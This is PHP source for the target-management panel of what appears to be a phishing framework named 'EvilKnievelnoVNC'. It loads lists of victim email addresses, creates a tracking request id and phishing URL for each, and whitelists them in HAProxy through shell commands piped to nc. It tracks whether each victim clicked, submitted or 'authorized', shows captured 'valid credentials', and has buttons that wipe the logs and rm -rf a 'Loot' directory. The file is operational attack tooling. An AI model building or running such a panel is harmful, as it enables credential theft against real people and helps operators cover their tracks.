<?php
// addtargets.php

$filename = "targets.json";
$path = "/etc/" . $filename;
$url = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$lootdir = "/etc/Loot/";

function GET($var)  { return isset($_GET[$var])  ? htmlspecialchars($_GET[$var])  : null; }
function POST($var) { return isset($_POST[$var]) ? htmlspecialchars($_POST[$var]) : null; }

function random_str(
	int $length = 6,
	string $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
): string {
	if ($length < 1) throw new \RangeException("Length must be a positive integer");
	$pieces = [];
	$max = mb_strlen($keyspace, '8bit') - 1;
	for ($i = 0; $i < $length; ++$i) {
		$pieces []= $keyspace[random_int(0, $max)];
	}
	return implode('', $pieces);
}

function getState($state) {
	switch((int)$state) {
		case 0:
			return "idle";
		case 1:
			return "clicked";
		case 2:
			return "submitted";
		case 3:
			return "authorized";
	}
}

// receive data with targets (list of mail addresses one per line)
if(isset($_POST["add"]) && isset($_POST["targets"])) {
	$separator = "\r\n";
	$targets = POST("targets");
	//$targets = htmlspecialchars($_POST["targets"]);
	$list = array();
	$line = strtok($targets, $separator);
	$count = 0;
	$whitelist = "";

	while ($line !== false) {
		$count += 1;

		// check if line is an email address
		if (!filter_var($line, FILTER_VALIDATE_EMAIL)) {
			echo "[!] Skipping entry that does not look like an email address ($line)";

			$line = strtok($separator);
			continue;
		}

		$reqid = random_str();
		$whitelist .= $reqid . PHP_EOL;

		// create array, generate request id per user (user id is the mail address)
		array_push($list, array(
			"reqid" => $reqid,
			"userid" => $line,
			"state" => 0,	// 0: idle, 1: clicked, 2: submitted, 3: authorized
			"blocked" => 0, // 0: not blocked, 1: blocked
			"time1" => null,
			"time2" => null,
			"time3" => null,
			"inputs" => null
		));

		# add reqid to haproxy whitelist (live)
		shell_exec("echo 'add acl /etc/whitelist.acl $reqid' | nc hap 8000");

		$line = strtok($separator);
	}

	// add reqid to haproxy whitelist (persistent)
	if(file_put_contents("/etc/whitelist.acl", $whitelist, FILE_APPEND) === false) {
		echo "[!] Error while adding reqids to whitelist.acl";
	}

	// if no state found, create one
	if(!file_exists($path)) {
		echo "<p>[*] Creating new file $filename</p>";
		file_put_contents($path, json_encode($list));

	// read state if any, append new entries
	} else {
		$orig = json_decode(file_get_contents($path), true);

		if(!is_array($orig)) {
			file_put_contents($path, json_encode($list));
		} else {
			foreach($list as $elem) {
				// check if user id already exists, then skip
				foreach($orig as $o) {
					if($o["userid"] === $elem["userid"]) {
						echo "<p>[!] Ignoring user id " . $elem["userid"] . ", already in state file!</p>";
						$count -= 1;
						continue 2;
					}
				}
				//if(array_search($elem["userid"], $orig)) {
				//}
				array_push($orig, $elem);
			}
			file_put_contents($path, json_encode($orig));
		}
	}
	
	//if($count > 0)
		//echo "<p>[*] $count new targets added</p>";
	
}

// clear state file
if(isset($_POST["cleartargets"])) {
	shell_exec("echo -n '' > " . $path);

	//clear whitelist
	shell_exec("echo -n '' > /etc/whitelist.acl");
	shell_exec("echo 'clear acl /etc/whitelist.acl $reqid' | nc hap 8000");

	//clear blacklist
	shell_exec("echo -n '' > /etc/blacklist.acl");
	shell_exec("echo 'clear acl /etc/blacklist.acl $reqid' | nc hap 8000");
}

// clear log files
if(isset($_POST["clearlogs"])) {
	shell_exec("echo -n '' > /etc/accesslog.txt; echo -n '' > /etc/submitlog.txt");
}

// clear loot directory
if(isset($_POST["clearloot"])) {
	shell_exec("rm -rf $lootdir*");
}

?><!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Targets|EvilKnievelnoVNC</title>
	<style>
	html, body {
		width: 98%;
		height: 97%;
		background: #eee;
		font-family: sans;
	}
	body {
		padding: 1%;
	}
	#left {
		float: left;
		width: 29%;
	}
	#right {
		float: right;
		width: 69%;
	}
	#targetinput {
		height: 400px;
		width: 100%;
	}
	#sub {
		float: right;
		font-weight: bold;
		font-size: 100%;
	}
	#sub2, #sub3, #sub4 {
		float: left;
		font-weight: bold;
		color: #c00;
	}
	#sub3, #sub4 { margin-left: 10px; }
	h2 { font-size: 120%; }
	table {
                width: 100%;
                /*max-height: 300px;
                overflow-y: scroll;*/
                font-size: 80%;
        }
        table td, table th {
                padding: 4px;
        }
        table th {
                position: sticky;
                background-color: #222;
                text-align: left;
		color: #83af00;
        }
	.reqid { font-family: monospace; }
	p { margin: 4px 0; padding: 0; }
	#copyurls {
		margin-top: 30px;
		width: 100%;
		min-height: 300px;
	}
	</style>
</head>
<body>
<div id="left">
	<h2>Add Targets</h2>

	<form action="<?= $url ?>" method="POST" id="form1">
		<textarea id="targetinput" name="targets" form="form1" placeholder="one email address per line"></textarea><br />
		<input id="sub" name="add" type="submit" value="Add &#62;&#62;" />
	</form>
	<form action="<?= $url ?>" method="POST" id="form2">
		<input id="sub2" name="cleartargets" type="submit" value="&#8553; Clear Targets" />
		<input id="sub3" name="clearlogs" type="submit" value="&#8553; Clear Logs" />
		<input id="sub4" name="clearloot" type="submit" value="&#8553; Clear Loot Dir" />
	</form>
</div>

<div id="right">
	<h2>List of Targets (<?= $filename ?>)</h2>
<?php
if(!file_exists($path)) {
	echo "<p>[!] File $filename not found. Create it by adding targets</p>";
} elseif($content = file_get_contents($path) === false) {
	echo "<p>[!] File $filename not readable";
} else {
	$data = json_decode(file_get_contents($path), true);

	if(!empty($data)) {
		echo "<table>" . PHP_EOL;
		echo "<tr><th>#</th><th>request id</th><th>user id</th><th>state</th><th>blocked</th><th>victim URL</th><th>valid credentials</th></tr>" . PHP_EOL;
		$cnt = 0;

		$domain = substr($_SERVER["HTTP_HOST"], 0, strpos($_SERVER["HTTP_HOST"], ":"));
		$url_prefix = "https://$domain/?reqid=";

		foreach($data as $dat) {
			$cnt += 1;
			echo "<tr>" . PHP_EOL;
			echo "<td>" . $cnt . "</td>";
			echo "<td class='reqid'>" . $dat["reqid"] . "</td>";
			echo "<td>" . $dat["userid"] . "</td>";
			echo "<td>" . getState($dat["state"]) . "</td>";
			echo "<td>" . ($dat["blocked"] == 0 ? "no" : "yes") . "</td>";
			echo "<td>" . $url_prefix . $dat["reqid"] . "</td>";
			//echo "<td>https://" . $_SERVER["HTTP_HOST"] . "/?reqid=" . $dat["reqid"] . "</td>";
			echo "<td>" . $dat["inputs"] . "</td>";
			echo "</tr>" . PHP_EOL;
		}
		echo "</table>" . PHP_EOL;

		echo "<textarea id='copyurls'>";

		foreach($data as $dat) {
			echo $url_prefix . $dat["reqid"] . PHP_EOL;
		}
		echo "</textarea>";
	} else {
		echo "<p>none yet</p>";
	}
}



?>
</div>

<div style="clear: both"></div>
</body>
</html>
